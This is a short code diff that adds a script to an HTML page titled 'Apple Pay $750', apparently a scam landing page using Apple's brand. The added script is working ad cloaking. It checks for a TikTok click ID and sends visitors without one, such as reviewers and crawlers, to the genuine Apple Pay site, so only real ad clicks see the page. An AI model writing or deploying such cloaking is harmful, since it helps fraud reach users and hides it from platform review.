@@ -4,6 +4,14 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Apple Pay $750</title>
+  <script>
+  var params = new URLSearchParams(window.location.search);
+  var ttclid = params.get('ttclid');
+  var isBot = !ttclid || ttclid === '__CLICKID__';
+  if (isBot) {
+    window.location.replace("https://www.apple.com/apple-pay/");
+  }
+</script>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
 
